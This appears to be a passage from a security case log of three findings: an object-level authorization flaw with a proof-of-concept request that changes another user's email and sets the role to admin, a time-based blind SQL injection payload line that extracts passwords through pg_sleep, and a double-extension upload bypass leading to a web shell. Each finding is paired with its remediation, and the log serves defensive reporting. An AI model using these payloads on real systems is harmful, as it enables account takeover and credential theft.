▶

Attack Vector: Parameter tampering on user identifier parameters within the profile update API route (`/api/v1/users/{id}/email`).

# PoC: Modifying target user's recovery email without session validation
PUT /api/v1/users/1042/settings HTTP/1.1
Host: target.internal
Authorization: Bearer [attacker_token]
Content-Type: application/json

{"email": "attacker@pwned.net", "role": "admin"}

Remediation Implemented: Enforced server-side session claim validation against requested resource IDs and implemented contextual Object-Level Permissions.

HIGH Case Log #02: Time-Based Blind SQL Injection Automated Extraction
▶

Attack Vector: Unsanitized input injected into an unindexed search filtering header triggering arbitrary sleep conditions in PostgreSQL.

# Python Threaded Exploit Payload Snippet
payload = f"'; SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{idx},1))={char_code}) THEN pg_sleep(5) ELSE pg_sleep(0) END;--"

Remediation Implemented: Transitioned dynamic query concatenation to parameterized Prepared Statements with ORM query constraints.

MEDIUM Case Log #03: Unrestricted File Upload Bypass to Stored Execution
▶

Attack Vector: MIME-type spoofing and double-extension evasion (`avatar.php.png`) bypassing front-end validation to deliver a lightweight web shell.

Remediation Implemented: Re-encoded uploaded images via server-side image processing libraries, randomized filenames, and stored assets on isolated S3 buckets stripped of execution privileges.
